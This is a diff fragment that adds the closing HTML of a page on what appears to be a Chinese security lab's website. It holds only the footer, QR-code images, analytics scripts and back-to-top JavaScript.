+        <li><a>微信关注</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+    <!-- APP下载 -->
+    <ul class="contact-way">
+        <li><a>安全播报APP</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+</div>
+
+    </div>
+</div>
+
+<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/common.js?v=4.5"></script>
+<script>$(function() {sync_count('comment');});</script>
+
+
+<!-- 语法高亮 -->
+<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
+<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
+    </div>
+
+        <div class="footer">
+        <div class="friend-link">
+            <a href="http://www.360.cn/" target="_blank">360首页</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">关于我们</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">联系我们</a>
+            <span>|</span>
+            <a href="/links/index.html" target="_blank">友情链接</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">招贤纳士</a>
+        </div>
+        <div class="copy">
+            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
+        </div>
+    </div>
+    
+</div>
+
+<!--奇舞团统计-->
+
+<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
+<script>
+    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
+</script>
+
+<div class="hide">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
+</div>
+<div class="backToTop_wrap off">
+    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
+</div>
+<script>
+    var $backToTop_wrap = $(".backToTop_wrap"),
+        $backToTop_btn = $("#back_to_top");
+
+    if ($(window).scrollTop() > 100) {
+        $backToTop_wrap.removeClass("off");
+    }
+    else {
+        $backToTop_wrap.addClass("off");
+    }
+
+    $(window).on("scroll", function () {
+        if ($(this).scrollTop() > 100) {
+            $backToTop_wrap.removeClass("off");
+        }
+        else {
+            $backToTop_wrap.addClass("off");
+        }
+    });
+
+    $backToTop_btn.on("click", function () {
+        $("html, body").animate({scrollTop: 0}, 120);
+    });
+
+    $(function () {
+        var navlist = $('.nav-list > li');
+
+        navlist.each(function () {
+            $(this).on('mouseenter', function () {
+                $(this).addClass('selected');
+            });
+
+            $(this).on('mouseleave', function () {
+                $(this).removeClass('selected');
+            });
+        });
+    })
+</script>
+
+
+
+</body>
+</html>
